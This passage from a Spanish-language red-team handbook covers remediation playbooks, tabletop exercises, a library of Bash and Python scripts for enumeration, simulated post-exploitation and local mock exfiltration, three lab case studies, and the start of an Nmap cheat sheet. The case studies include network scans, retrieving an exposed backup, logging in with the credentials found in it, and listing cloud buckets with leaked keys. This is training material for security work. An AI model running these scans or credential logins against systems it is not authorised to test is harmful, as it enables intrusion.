Se recomienda su uso sólo con comandos **no destructivos**, preferiblemente en entornos de prueba.

---

## 7. Ejemplo de playbook Linux: limpieza y permisos

```yaml
playbook:
  id: RT-FIX-2025-002
  titulo: "Limpieza de archivos temporales y ajuste de permisos"
  descripcion: "Remediación de configuración débil y exposición en /tmp y /var/www."
  pasos:
    - nombre: "Eliminar archivos temporales antiguos"
      comando: "find /tmp -type f -mtime +7 -delete"
    - nombre: "Ajustar permisos en /var/www"
      comando: "chmod -R 750 /var/www"
    - nombre: "Revisar usuarios con UID 0"
      comando: "awk -F: '$3 == 0 {print $1}' /etc/passwd"
  responsable: "Administrador Linux"
  prioridad: "Media"
  estado: "Pendiente"
```

---

## 8. Verificación post-remediación

Cada acción debe validarse mediante **retesting controlado**, idealmente ejecutado por el mismo Red Team que detectó el hallazgo, pero con **rol pasivo de verificación**.

Checklist de verificación:

* [ ] Vulnerabilidad no reproducible.
* [ ] Configuración actualizada correctamente.
* [ ] Logs confirmaron el cambio.
* [ ] No hubo efectos secundarios.
* [ ] Registro firmado del cierre.

---

## 9. Integración con frameworks de seguridad

* **CIS Benchmarks:** lineamientos de configuración segura (Windows, Linux, Docker, etc.).
* **NIST SP 800-53:** control de seguridad y mitigación estructurada.
* **ISO/IEC 27002:** políticas organizativas post-auditoría.
* **MITRE D3FEND:** contramedidas mapeadas a TTPs ATT&CK.

Ejemplo:
Si el hallazgo mapeado era T1059 (Command-Line Execution), su mitigación D3FEND sería *“Command Obfuscation Detection”* o *“Script Execution Restriction.”*

---

## 10. Monitoreo continuo de remediación

Las acciones deben registrarse y monitorearse en un **dashboard interno** con métricas clave:

| KPI                           | Descripción                              | Objetivo |
| ----------------------------- | ---------------------------------------- | -------- |
| % Hallazgos cerrados          | Porcentaje de vulnerabilidades mitigadas | ≥90%     |
| Tiempo promedio de corrección | Desde informe hasta validación           | ≤7 días  |
| % Acciones validadas          | Revisión técnica por otro equipo         | 100%     |
| % Impacto residual            | Riesgo que persiste tras corrección      | <10%     |

Automatizar este seguimiento permite verificar progreso en tiempo real.

---

## 11. Ejemplo de dataset JSON (seguimiento de remediación)

```json
[
  {
    "id": "RT-2025-001",
    "vulnerabilidad": "RDP abierto sin MFA",
    "estado": "Mitigado",
    "responsable": "Admin Win",
    "fecha_cierre": "2025-11-14"
  },
  {
    "id": "RT-2025-002",
    "vulnerabilidad": "Permisos 777 en /var/www",
    "estado": "Pendiente",
    "responsable": "Admin Linux"
  }
]
```

Este dataset puede combinarse con dashboards generados en Python, Grafana o PowerBI para mostrar el estado del programa de remediación.

---

## 12. Playbook general de hardening (resumen exportable)

| Área             | Acción                       | Herramienta / Comando                                   | Validación          |
| ---------------- | ---------------------------- | ------------------------------------------------------- | ------------------- |
| **Windows**      | Deshabilitar SMBv1           | `Set-SmbServerConfiguration -EnableSMB1Protocol $false` | Log del sistema     |
| **Linux**        | Restringir root SSH          | `/etc/ssh/sshd_config → PermitRootLogin no`             | `sshd -t`           |
| **Red**          | Filtrar puertos innecesarios | `ufw deny 23` / `iptables -A INPUT`                     | Escaneo nmap        |
| **Aplicaciones** | Actualizar dependencias      | `pip list --outdated`                                   | Informe post-update |
| **Usuarios**     | MFA obligatorio              | Azure AD / PAM                                          | Prueba de acceso    |
| **EDR/SIEM**     | Correlación activa           | Elastic Agent                                           | Alerta validada     |

---

## 13. Conclusión

La fase de remediación es donde el trabajo técnico del Red Team se transforma en **valor estratégico** para la organización.
Sin ella, un reporte es sólo diagnóstico; con ella, se convierte en un **plan de fortalecimiento medible**.

El hardening post-assessment combina automatización (playbooks), coordinación (responsables), y validación (retesting), creando un circuito cerrado de mejora continua.

Cada vulnerabilidad corregida deja un aprendizaje, cada playbook una nueva defensa, y cada ejercicio una evidencia tangible de madurez.

---

# Capítulo 57 — Ejercicios y Simulaciones de Tabletop

**Planificación, ejecución y lecciones aprendidas (con kits de ejercicios scriptables)**

---

## Objetivos

* Comprender qué son los **ejercicios tabletop** y cómo se integran dentro de una estrategia Red Team / Blue Team.
* Aprender a **planificar y ejecutar simulaciones realistas** sin impacto operativo.
* Diseñar **kits de ejercicios automatizables o scriptables** para repetir escenarios en laboratorio o aula.
* Estandarizar las **lecciones aprendidas** y su documentación en formatos reutilizables.
* Vincular los resultados con la mejora continua del plan de respuesta a incidentes (IRP).

> **Aviso ético:** los ejercicios tabletop deben realizarse siempre en **entornos simulados y bajo aprobación gerencial**. No implican ejecución de exploits reales ni compromisos de sistemas en producción.

---

## 1. ¿Qué es un ejercicio tabletop?

Un **tabletop exercise** (TTX) es una simulación narrativa de incidentes de seguridad, donde los participantes discuten, deciden y actúan **de forma teórica o parcial**, sin activar herramientas reales.
Su meta es **evaluar la preparación y coordinación** entre áreas (IT, seguridad, legal, RR. HH., comunicaciones).

**Ejemplo:**

> “Se detecta un acceso no autorizado a una base de datos crítica. ¿Quién notifica? ¿Qué sistemas se aíslan? ¿Qué comunica el CISO al directorio?”

Estos ejercicios permiten practicar decisiones bajo presión sin riesgos reales.

---

## 2. Ventajas del enfoque tabletop

* **Costo y riesgo bajos:** no requiere infraestructura compleja.
* **Escenarios personalizados:** adaptables a sector, tecnología o nivel de madurez.
* **Evaluación de roles y protocolos:** valida si los equipos conocen sus responsabilidades.
* **Generación de lecciones aprendidas:** mejora tangible en políticas y comunicación.
* **Preparación para auditorías y crisis reales.**

---

## 3. Estructura de un tabletop efectivo

| Fase                   | Descripción                                         | Resultado esperado                  |
| ---------------------- | --------------------------------------------------- | ----------------------------------- |
| **1. Planificación**   | Seleccionar escenario, definir objetivos y actores. | Guion del ejercicio.                |
| **2. Ejecución**       | Moderador guía el escenario y los eventos.          | Registro de decisiones y tiempos.   |
| **3. Evaluación**      | Analizar respuestas, tiempos y coordinación.        | Informe de madurez.                 |
| **4. Mejora continua** | Aplicar correcciones y repetir.                     | Nueva versión de plan de respuesta. |

---

## 4. Roles participantes

| Rol                        | Responsabilidad                                         |
| -------------------------- | ------------------------------------------------------- |
| **Moderador**              | Dirige la simulación, controla tiempos y mantiene foco. |
| **Red Team (Simuladores)** | Crea los eventos y escenarios (sin ejecutar ataques).   |
| **Blue Team (Defensores)** | Describe acciones hipotéticas ante cada evento.         |
| **Gestión / Dirección**    | Toma decisiones estratégicas o aprueba medidas.         |
| **Documentador**           | Registra decisiones, tiempos y resultados.              |

Idealmente, el moderador es neutral y con experiencia tanto técnica como organizacional.

---

## 5. Diseño de escenarios

Cada escenario debe cumplir tres condiciones:

1. **Relevancia:** basado en amenazas reales o recientes.
2. **Claridad:** guion simple y progresivo (etapas escalonadas).
3. **Capacidad de decisión:** debe forzar una respuesta o dilema.

Ejemplo de escenario:

> “Un atacante externo obtiene acceso a una cuenta de administrador cloud. El SOC detecta anomalías en logs IAM. El CISO recibe una alerta y debe decidir si cortar accesos o investigar primero.”

Cada decisión genera consecuencias que el moderador revela gradualmente.

---

## 6. Ejemplo de kit de simulación (JSON scriptable)

```json
{
  "id": "TTX-2025-001",
  "titulo": "Compromiso de credenciales administrativas",
  "fases": [
    {
      "nombre": "Detección inicial",
      "evento": "Alertas IAM detectan uso sospechoso de API keys.",
      "preguntas": [
        "¿Quién debe ser notificado primero?",
        "¿Se bloquean las claves o se investiga el origen?"
      ]
    },
    {
      "nombre": "Investigación",
      "evento": "El equipo forense encuentra indicios de exfiltración parcial.",
      "preguntas": [
        "¿Qué sistemas se aíslan?",
        "¿Se contacta a legal o prensa?"
      ]
    },
    {
      "nombre": "Remediación",
      "evento": "Se restablecen accesos, pero se detectan logs borrados.",
      "preguntas": [
        "¿Cómo se recuperan evidencias?",
        "¿Qué controles se fortalecen?"
      ]
    }
  ]
}
```

Este formato JSON puede importarse en herramientas Python o web para reproducir dinámicamente el ejercicio y registrar las decisiones del grupo.

---

## 7. Automatización básica del tabletop (Python educativo)

```python
#!/usr/bin/env python3
"""
tabletop_runner.py — Simulador de ejercicios TTX a partir de JSON.
Uso ético: entrenamiento interno.
"""
import json, time

def ejecutar_tabletop(archivo):
    with open(archivo, 'r') as f:
        data = json.load(f)
    print(f"== Escenario: {data['titulo']} ==")
    for fase in data['fases']:
        print(f"\n[Fase] {fase['nombre']}")
        print(f"Evento: {fase['evento']}")
        for p in fase['preguntas']:
            input(f" - {p} → Respuesta: ")
        time.sleep(1)
    print("\n[+] Ejercicio finalizado. Registra lecciones aprendidas.")

if __name__ == "__main__":
    ejecutar_tabletop("ttx_credenciales.json")
```

El script actúa como moderador digital, mostrando fases y registrando respuestas directamente en consola.
Las salidas pueden redirigirse a archivos de registro (`> resultados.txt`) para posterior análisis.

---

## 8. Métricas de desempeño y madurez

| Métrica                              | Descripción                                   | Objetivo       |
| ------------------------------------ | --------------------------------------------- | -------------- |
| **Tiempo de decisión (TTD)**         | Minutos entre evento y respuesta.             | < 5 min        |
| **Roles activos**                    | Participantes que respondieron según función. | ≥ 80%          |
| **Comunicación efectiva**            | Coordinación sin contradicciones.             | Alta           |
| **Documentación de incidentes**      | Uso de plantillas IR o tickets.               | 100%           |
| **Acciones de mejora identificadas** | Cantidad de recomendaciones post-ejercicio.   | ≥ 3 por sesión |

Estas métricas permiten comparar la evolución del equipo tras cada simulación.

---

## 9. Repositorio de escenarios y rotación

Los tabletop deben realizarse **trimestralmente**, con rotación temática:

| Categoría          | Ejemplo de escenario                         |
| ------------------ | -------------------------------------------- |
| **Cloud Security** | Exposición pública de bucket S3.             |
| **Phishing**       | Acceso inicial vía credenciales robadas.     |
| **Ransomware**     | Encriptación parcial de servidores críticos. |
| **Insider Threat** | Empleado exporta datos a USB.                |
| **Supply Chain**   | Biblioteca comprometida en CI/CD.            |

Mantener un **repositorio JSON/YAML** de escenarios permite generar combinaciones automáticas con scripts.

---

## 10. Documentación de resultados y lecciones aprendidas

Cada ejercicio debe dejar un registro claro de:

* Decisiones tomadas y su justificación.
* Dificultades encontradas (técnicas o de comunicación).
* Planes de acción derivados.
* Responsables asignados y fechas de implementación.

Ejemplo de formato de resultados (YAML):

```yaml
resultados:
  ejercicio: "TTX-2025-001"
  fecha: "2025-11-10"
  equipo: ["CISO", "SOC Lead", "Infra", "Legal"]
  decisiones:
    - fase: "Detección inicial"
      accion: "Bloquear claves IAM comprometidas"
    - fase: "Investigación"
      accion: "Revisar CloudTrail y snapshot de disco"
  lecciones:
    - "Necesidad de monitoreo continuo en IAM"
    - "Mejorar tiempos de escalamiento"
```

---

## 11. Integración con respuesta a incidentes

El **plan de respuesta a incidentes (IRP)** debe actualizarse después de cada tabletop.
El objetivo no es solo medir reacciones, sino fortalecer procesos de comunicación y gobernanza.

Checklist de integración:

* [ ] Roles revisados y actualizados.
* [ ] Procedimientos validados.
* [ ] Contactos de emergencia confirmados.
* [ ] Lecciones aplicadas en playbooks reales.
* [ ] Nuevas métricas definidas.

---

## 12. Automatización avanzada: rotador de escenarios

Un script puede seleccionar escenarios aleatorios para diversificar entrenamientos:

```python
#!/usr/bin/env python3
"""
tabletop_randomizer.py — Selecciona un escenario aleatorio del repositorio.
"""
import json, random, glob

archivos = glob.glob("escenarios/*.json")
archivo = random.choice(archivos)
print(f"Ejecutando escenario: {archivo}")
```

El resultado permite entrenar al equipo con nuevos contextos en cada sesión.

---

## 13. Indicadores de madurez del programa TTX

| Nivel          | Características                                   |
| -------------- | ------------------------------------------------- |
| **Inicial**    | Ejercicios esporádicos, sin documentación.        |
| **Definido**   | Escenarios estándar, roles establecidos.          |
| **Gestionado** | Métricas y seguimiento de acciones.               |
| **Optimizado** | Simulaciones integradas con Red/Blue/Purple Team. |

El objetivo final es llegar al nivel **Optimizado**, donde las simulaciones son parte natural del ciclo de defensa y aprendizaje.

---

## 14. Conclusión

Los ejercicios tabletop son el punto de encuentro entre la teoría y la práctica.
Permiten al equipo experimentar el caos de un incidente, pero dentro de un entorno **seguro, educativo y medible**.

Con kits scriptables y repositorios JSON/YAML, los escenarios se pueden reproducir, rotar y versionar, creando una cultura de **preparación continua**.
Cada sesión revela no solo lo que falta detectar, sino lo que falta coordinar.

El éxito no se mide en cuántas decisiones fueron correctas, sino en cuán rápido el equipo aprendió a tomarlas.

---

## Parte X — Anexos prácticos y recursos avanzados

# Capítulo 58 — Biblioteca de Scripts Reutilizables

**Colección de scripts Bash y Python organizados por objetivo (enumeración, explotación, exfiltración controlada)**

---

## Objetivos

* Presentar una **biblioteca unificada de utilidades de Red Teaming** para laboratorios y ejercicios autorizados.
* Reunir **scripts prácticos y modulares** en Bash y Python, listos para adaptar y ampliar.
* Organizar el código por fases de una campaña Red Team: *enumeración, explotación controlada y exfiltración simulada*.
* Enseñar cómo integrar estos scripts en pipelines, automatizaciones o frameworks de ejercicios.
* Enfatizar la **ética y los límites legales** de su uso: todos los ejemplos están diseñados para entornos de práctica y simulación con consentimiento.

> **Aviso ético:** todo código aquí incluido está destinado a **laboratorios locales** y entornos aislados, jamás a sistemas ajenos o productivos.
> El propósito es educativo: aprender a automatizar técnicas y entender su funcionamiento desde una perspectiva defensiva y controlada.

---

## 1. Estructura de la biblioteca

Cada script pertenece a una categoría funcional:

| Categoría                  | Propósito                                                 | Lenguaje      |
| -------------------------- | --------------------------------------------------------- | ------------- |
| **Enumeración**            | Descubrir hosts, puertos, servicios y banners.            | Bash / Python |
| **Explotación controlada** | Validar vulnerabilidades conocidas sin daño real.         | Python        |
| **Post-explotación**       | Simular persistencia o recopilación de datos del entorno. | Bash / Python |
| **Exfiltración simulada**  | Reproducir transferencias seguras de datos dummy.         | Bash          |
| **Análisis y reporting**   | Convertir resultados en reportes legibles o CSV.          | Python        |

---

## 2. Scripts de enumeración

### 2.1 Escaneo básico de red (Bash)

```bash
#!/bin/bash
# scan_net.sh — Escaneo rápido de red local.
# Uso ético: detectar hosts activos en laboratorio.
if [ -z "$1" ]; then
  echo "Uso: $0 <subred> (ej. 192.168.0)"
  exit 1
fi
for i in {1..254}; do
  ping -c 1 -W 1 "$1.$i" &>/dev/null && echo "Host activo: $1.$i"
done
```

**Ejemplo:**
`./scan_net.sh 192.168.56` → lista los hosts activos de la subred virtual.

---

### 2.2 Enumeración de puertos con Nmap y exportación

```bash
#!/bin/bash
# nmap_enum.sh — Escaneo de puertos con exportación CSV.
read -p "IP objetivo: " TARGET
nmap -sS -T4 -p- -oX scan.xml $TARGET
xsltproc scan.xml -o scan.html
grep 'portid=' scan.xml | sed 's/.*portid="\([0-9]*\)".*/\1/' > open_ports.txt
echo "Puertos abiertos exportados a open_ports.txt"
```

---

### 2.3 Enumeración de banners HTTP (Python)

```python
#!/usr/bin/env python3
# banner_http.py — Obtiene encabezados HTTP de un dominio.
import requests, sys
if len(sys.argv) != 2:
    print("Uso: python3 banner_http.py <url>")
    sys.exit(1)
r = requests.get(sys.argv[1], timeout=5)
for h, v in r.headers.items():
    print(f"{h}: {v}")
```

Ejemplo:
`python3 banner_http.py https://lab.local`

---

## 3. Scripts de explotación controlada

> **Advertencia:** estos ejemplos no ejecutan exploits reales; solo reproducen el flujo lógico de una explotación simulada.

### 3.1 Verificación de versión vulnerable (Python)

```python
#!/usr/bin/env python3
# check_version.py — Detecta versiones vulnerables simuladas.
import re, sys
banner = "Apache/2.4.29 (Ubuntu)"
if re.search(r"2\.4\.29", banner):
    print("[!] Versión vulnerable detectada (simulada).")
else:
    print("[+] Sistema actualizado.")
```

---

### 3.2 Simulación de payload inofensivo (Bash)

```bash
#!/bin/bash
# fake_payload.sh — Simula la entrega de un payload sin ejecución real.
TARGET="$1"
if [ -z "$TARGET" ]; then
  echo "Uso: $0 <ip>"
  exit 1
fi
echo "Simulando entrega a $TARGET..."
sleep 2
echo "Payload benigno entregado (sin ejecución)."
```

---

### 3.3 Automatización de validación de servicios expuestos

```python
#!/usr/bin/env python3
# service_checker.py — Verifica exposición de servicios en lista de IPs.
import socket
targets = ["192.168.56.101", "192.168.56.102"]
ports = [22, 80, 443]
for t in targets:
    for p in ports:
        s = socket.socket()
        s.settimeout(1)
        try:
            s.connect((t, p))
            print(f"[+] {t}:{p} abierto")
        except:
            pass
        s.close()
```

---

## 4. Scripts de post-explotación simulada

Estos scripts **no extraen datos reales**, sino información del entorno del laboratorio para fines educativos.

### 4.1 Recopilación de sistema (Bash)

```bash
#!/bin/bash
# sys_info.sh — Recolecta información básica del sistema.
OUT="sysinfo.txt"
echo "[*] Usuario: $(whoami)" > $OUT
echo "[*] Hostname: $(hostname)" >> $OUT
echo "[*] Kernel: $(uname -r)" >> $OUT
echo "[*] Interfaces:" >> $OUT
ip a >> $OUT
echo "[+] Informe generado en $OUT"
```

---

### 4.2 Listado de procesos y conexiones (Python)

```python
#!/usr/bin/env python3
# proc_net_info.py — Simula post-explotación: procesos y sockets abiertos.
import psutil, json
data = {"procesos": [], "conexiones": []}
for p in psutil.process_iter(attrs=["pid","name","username"]):
    data["procesos"].append(p.info)
for c in psutil.net_connections(kind='inet'):
    data["conexiones"].append({"laddr": str(c.laddr), "raddr": str(c.raddr), "status": c.status})
open("lab_sysdata.json","w").write(json.dumps(data, indent=2))
print("[+] Archivo lab_sysdata.json creado.")
```

---

## 5. Scripts de exfiltración simulada

### 5.1 Transferencia segura de archivo dummy (Bash)

```bash
#!/bin/bash
# exfil_sim.sh — Simula exfiltración cifrada sin datos reales.
FILE="dummy.txt"
echo "Data de prueba - no confidencial" > $FILE
tar czf dummy.tgz $FILE
openssl enc -aes-256-cbc -salt -in dummy.tgz -out dummy.enc -k "redteam2025"
echo "[+] Archivo cifrado: dummy.enc (simulación)"
```

Este script solo crea un archivo cifrado localmente, sin conexión remota.

---

### 5.2 Simulación de canal HTTPS local (Python)

```python
#!/usr/bin/env python3
# exfil_http_sim.py — Simula transferencia HTTPS local de archivo benigno.
from http.server import HTTPServer, SimpleHTTPRequestHandler
import ssl
server = HTTPServer(('localhost', 4443), SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='server.pem', server_side=True)
print("[+] Servidor HTTPS local escuchando en puerto 4443 (simulado)")
server.serve_forever()
```

Puedes ejecutar `curl -k https://localhost:4443/dummy.enc` desde otra terminal para verificar transferencia local.

---

## 6. Scripts de análisis y reporting

### 6.1 Conversión de logs a CSV

```python
#!/usr/bin/env python3
# log_to_csv.py — Convierte logs JSON en CSV legible.
import json, csv
data = json.load(open("lab_sysdata.json"))
with open("procesos.csv","w",newline="") as f:
    w = csv.writer(f)
    w.writerow(["PID","Nombre","Usuario"])
    for p in data["procesos"]:
        w.writerow([p["pid"], p["name"], p["username"]])
print("[+] Archivo procesos.csv generado.")
```

---

### 6.2 Generador de resumen de laboratorio

```bash
#!/bin/bash
# report_lab.sh — Resume estado del entorno Red Team.
echo "==== Reporte de laboratorio ===="
echo "Fecha: $(date)"
echo "Usuarios activos:"
who
echo "Interfaces de red:"
ip link show | grep UP
echo "Servicios escuchando:"
ss -tuln | head -n 10
```

---

## 7. Organización recomendada de la biblioteca

```
/scripts
 ├── enumeracion/
 │    ├── scan_net.sh
 │    ├── nmap_enum.sh
 │    └── banner_http.py
 ├── explotacion/
 │    ├── check_version.py
 │    ├── fake_payload.sh
 │    └── service_checker.py
 ├── postex/
 │    ├── sys_info.sh
 │    └── proc_net_info.py
 ├── exfil/
 │    ├── exfil_sim.sh
 │    └── exfil_http_sim.py
 └── reportes/
      ├── log_to_csv.py
      └── report_lab.sh
```

Cada subcarpeta incluye un README con descripción, dependencias y permisos necesarios.
Los scripts se pueden integrar fácilmente en herramientas de automatización o pipelines CI/CD para entornos de práctica.

---

## 8. Buenas prácticas para reutilizar scripts

1. **Versionar cada script:** mantener control de cambios y autoría.
2. **Documentar parámetros:** cada script debe incluir uso, propósito y limitaciones.
3. **Usar logs y validaciones:** verificar que los comandos se ejecutan en entorno seguro.
4. **Incluir límites de tiempo (`timeout`) y chequeos de permisos.**
5. **Evitar hardcodear contraseñas o rutas absolutas.**
6. **Usar nombres claros:** reflejar objetivo y tipo de script (`enum_host.sh`, `report_sys.py`).
7. **Pruebas unitarias:** ejecutar con datos simulados antes de usar en ejercicios Red Team.

---

## 9. Exportación y portabilidad

Puedes comprimir la biblioteca con:

```bash
tar czf redteam_scripts.tar.gz scripts/
```

y desplegarla en cualquier entorno Kali, Debian o laboratorio Docker con:

```bash
tar xzf redteam_scripts.tar.gz -C /opt/redteam
```

Todos los scripts usan dependencias estándar de Linux o librerías Python comunes (`requests`, `psutil`, `json`, `csv`).

---

## 10. Conclusión

Una **biblioteca de scripts reutilizables** es la columna vertebral de un laboratorio Red Team profesional:
acelera el trabajo, garantiza consistencia y permite documentar cada paso con transparencia y trazabilidad.

Estos scripts no son “armas”, sino **instrumentos de aprendizaje**: demuestran cómo se automatizan tareas, cómo se simula el comportamiento adversario y cómo se genera evidencia reproducible.

Cada script puede servir como **bloque base** para el desarrollo de herramientas defensivas, detección de comportamientos o ejercicios Purple Team.

> La ética del código reside en su propósito.
> El propósito aquí es la comprensión, la documentación y la mejora de la seguridad.

---

# Capítulo 59 — Casos de Estudio

**Tres campañas completas paso a paso: desde reconocimiento hasta reporte (con código, logs y evidencias)**

---

## Objetivos

* Mostrar ejemplos **completos y éticamente reproducibles** de campañas Red Team, desde la fase de reconocimiento hasta la elaboración del informe final.
* Integrar herramientas, scripts y metodologías presentadas en capítulos anteriores.
* Demostrar cómo **documentar y registrar evidencias** en cada etapa.
* Enseñar cómo convertir una operación técnica en un **reporte profesional y trazable**.
* Unificar todo el conocimiento adquirido en escenarios realistas dentro de laboratorio.

> **Aviso ético:** todos los casos están ejecutados en entornos simulados (máquinas virtuales Kali + Windows/Linux víctimas), con autorización expresa y sin interacción con sistemas externos. Los ejemplos son educativos y reproducibles para entrenamiento profesional controlado.

---

## 1. Caso de Estudio #1 — *Infraestructura expuesta y movimiento lateral controlado*

### 1.1 Escenario

Una empresa ficticia (*LabCorp*) posee una red interna simulada:

* 1 servidor Windows 2019 con RDP activo.
* 1 servidor Linux con Apache.
* 1 estación cliente Windows 10.

### 1.2 Fase 1: Reconocimiento y descubrimiento

**Objetivo:** identificar servicios expuestos y activos válidos.

**Script usado:**

```bash
./scripts/enumeracion/scan_net.sh 192.168.56
```

**Salida (extracto):**

```
Host activo: 192.168.56.101
Host activo: 192.168.56.102
Host activo: 192.168.56.103
```

Luego, escaneo detallado de puertos:

```bash
nmap -sS -T4 -A 192.168.56.101 -oX nmap_lab1.xml
```

**Hallazgos:**

* Puerto 3389/tcp (RDP) abierto
* Puerto 80/tcp (Apache) abierto

### 1.3 Fase 2: Enumeración de servicios

**Banner grabado:**

```
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)
```

El script `banner_http.py` confirma versión vulnerable (simulada).

### 1.4 Fase 3: Explotación controlada

**Script simulado:**

```python
python3 scripts/explotacion/check_version.py
```

**Resultado:**

```
[!] Versión vulnerable detectada (simulada)
```

No se ejecuta explotación real, pero se registra el hallazgo y la posible escalada.

### 1.5 Fase 4: Movimiento lateral simulado

Usando el script `service_checker.py`, se valida que el puerto 3389 está activo en otra máquina (`192.168.56.103`), indicando posible pivoting controlado.

**Salida:**

```
[+] 192.168.56.103:3389 abierto
```

### 1.6 Fase 5: Evidencias y mitigación

**Evidencia JSON (lab1_ttps.json):**

```json
[
  {"tactica": "Discovery", "tecnica": "Network Scanning", "codigo": "T1046"},
  {"tactica": "Execution", "tecnica": "Command-Line Interface", "codigo": "T1059"}
]
```

**Reporte resumido:**

* Riesgo: exposición RDP sin restricción IP.
* Mitigación: aplicar MFA, limitar red, reforzar EDR.

---

## 2. Caso de Estudio #2 — *Aplicación web vulnerable y exfiltración simulada*

### 2.1 Escenario

Un servidor web en `192.168.56.105` corre un CMS desactualizado con formularios inseguros.

### 2.2 Fase 1: Enumeración web

**Comando:**

```bash
gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**

```
/admin (Status: 200)
/uploads (Status: 403)
/backup.zip (Status: 200)
```

Descarga de archivo sospechoso:

```bash
wget http://192.168.56.105/backup.zip
unzip backup.zip
```

**Contenido:** credenciales simuladas (`admin:test123`).

---

### 2.3 Fase 2: Autenticación y acceso controlado

**Script Python de prueba:**

```python
import requests
login = {"user":"admin","pass":"test123"}
r = requests.post("http://192.168.56.105/login", data=login)
print("Status:", r.status_code)
```

**Salida:**
`Status: 200 → Acceso concedido (simulado).`

---

### 2.4 Fase 3: Post-explotación y recopilación de sistema

El script `proc_net_info.py` recopila información simulada:

```bash
python3 scripts/postex/proc_net_info.py
```

**Salida parcial (lab_sysdata.json):**

```json
{
  "procesos": [{"pid": 1, "name": "apache2", "username": "www-data"}],
  "conexiones": [{"laddr": "192.168.56.105:80", "status": "LISTEN"}]
}
```

---

### 2.5 Fase 4: Exfiltración simulada

**Script usado:**

```bash
./scripts/exfil/exfil_sim.sh
```

**Salida:**

```
[+] Archivo cifrado: dummy.enc (simulación)
```

Se demuestra capacidad de empaquetar y cifrar información sin salida de red real.

---

### 2.6 Fase 5: Evidencias y mapeo ATT&CK

**TTPs JSON:**

```json
[
  {"tactica":"Collection","tecnica":"Data Staged","codigo":"T1074"},
  {"tactica":"Exfiltration","tecnica":"Encrypted Channel","codigo":"T1048"}
]
```

**Gráfico generado con attack_matrix.py:**
Muestra tácticas “Collection” y “Exfiltration” resaltadas.

---

### 2.7 Recomendaciones

* Validar formularios web y sanitizar entradas.
* Restringir directorios sensibles.
* Monitorear logs HTTP de transferencia inusual.

---

## 3. Caso de Estudio #3 — *Compromiso de identidad y respuesta Purple Team*

### 3.1 Escenario

Un usuario interno en `lab.internal` filtra accidentalmente credenciales en un repositorio público.
El Red Team simula un atacante que las encuentra, mientras el Blue Team intenta detectarlo.

---

### 3.2 Fase 1: Recolección OSINT

**Script:**

```python
python3 osint_repo.py "lab.internal"
```

(Script educativo que busca patrones de API keys en Git local.)

**Resultado:**

```
Clave simulada encontrada en config.py
```

---

### 3.3 Fase 2: Acceso simulado a recurso cloud

**Comando:**

```bash
aws s3 ls --endpoint-url http://192.168.56.200
```

Salida (simulada):

```
bucket-lab-logs
bucket-backups
```

---

### 3.4 Fase 3: Alerta del Blue Team

El EDR detecta conexión no habitual a endpoint S3.
El SOC activa **playbook de respuesta** (Capítulo 56).

**Playbook YAML:**

```yaml
playbook:
  id: RT-IR-2025-009
  titulo: "Compromiso simulado de credenciales Cloud"
  pasos:
    - nombre: "Revocar token IAM"
    - nombre: "Notificar CISO y Legal"
    - nombre: "Revisar logs CloudTrail"
    - nombre: "Ejecutar tabletop de respuesta (TTX)"
```

---

### 3.5 Fase 4: Validación y coordinación Purple Team

Ambos equipos comparan sus logs:

**Red Team log extract:**

```
[12:33:10] Enumerated buckets
[12:33:15] Stopped simulation - no data exfiltrated
```

**Blue Team log extract:**

```
[12:33:14] Alert - New AWS API usage from non-approved IP
```

Correlación indica **detección efectiva con 4 segundos de diferencia**.

---

### 3.6 Fase 5: Informe final

**Métricas:**

| Indicador                  | Resultado |
| -------------------------- | --------- |
| Tiempo de detección (TTD)  | 4 s       |
| Tiempo de respuesta (MTTR) | 3 min     |
| Detección correlativa SIEM | Sí        |
| Falsos positivos           | 0         |

**Conclusión:** detección y respuesta dentro de SLA.
La simulación validó la eficacia del monitoreo cloud y las políticas IAM.

---

## 4. Resumen de resultados de las tres campañas

| Caso | Enfoque                   | Tácticas MITRE                     | Detección    | Estado final |
| ---- | ------------------------- | ---------------------------------- | ------------ | ------------ |
| #1   | Red interna expuesta      | Discovery, Execution               | Parcial      | Mitigado     |
| #2   | Aplicación web vulnerable | Collection, Exfiltration           | No detectada | Remediada    |
| #3   | Compromiso cloud simulado | Credential Access, Defense Evasion | Detectada    | Validado     |

---

## 5. Consolidación de evidencias

Todos los resultados se almacenan bajo la estructura:

```
/casos/
 ├── caso1/
 │    ├── nmap_lab1.xml
 │    ├── lab1_ttps.json
 │    └── reporte_lab1.pdf
 ├── caso2/
 │    ├── http_enum.txt
 │    ├── lab_sysdata.json
 │    └── attack_matrix.png
 ├── caso3/
 │    ├── osint_repo.log
 │    ├── playbook_ir.yaml
 │    └── correlacion.json
```

Este modelo de repositorio garantiza **trazabilidad total y reproducibilidad** de las pruebas.

---

## 6. Conclusión

Estos tres casos integran todo el ciclo operativo del Red Team:
desde el *reconocimiento* hasta el *reporte final*, incorporando scripts, evidencias, métricas y análisis.

El Red Team aprende a **documentar cada acción con precisión forense**; el Blue Team mejora su capacidad de detección y correlación.
Ambos se unen en un enfoque **Purple Teaming** que transforma los hallazgos en conocimiento institucional.

Cada log, script o json registrado deja de ser un archivo y se convierte en un **testimonio técnico y metodológico** del aprendizaje continuo en seguridad ofensiva y defensiva.

---

# Capítulo 60 — Apéndices: Comandos, Cheat-Sheets y Referencias

**Resumen de utilidades, comandos críticos y errores comunes que todo Red Teamer debe evitar**

---

## Objetivos

* Reunir en un solo capítulo las **chuletas operativas (cheat-sheets)** más útiles para trabajo diario de Red Team y pentesting.
* Cubrir los comandos más empleados de **Nmap, Tcpdump, Bash y Python**, con ejemplos reales.
* Presentar una guía de **errores comunes ("impractical mistakes")** que pueden comprometer la integridad técnica o ética del operador.
* Ofrecer una **lista de referencias** y lecturas recomendadas que amplían el marco técnico y metodológico del libro.

> **Aviso ético:** incluso las acciones más pequeñas ejecutadas sin control o sin autorización pueden generar consecuencias legales y reputacionales. La ética es la frontera más importante en el hacking profesional.

---

## 1. Cheat-Sheet de Nmap — *Reconocimiento y Enumeración*

| Objetivo                  | Comando                   | Descripción                          |
| ------------------------- | ------------------------- | ------------------------------------ |
| Escaneo rápido de puertos | `nmap -F <IP>`            | Escanea puertos más comunes.         |
| Escaneo completo TCP      | `nmap -sS -p- <IP>`       | Escanea todos los puertos TCP.       |
| Detección de versión y SO | `nmap -A <IP>`            | Muestra banners y sistema operativo. |
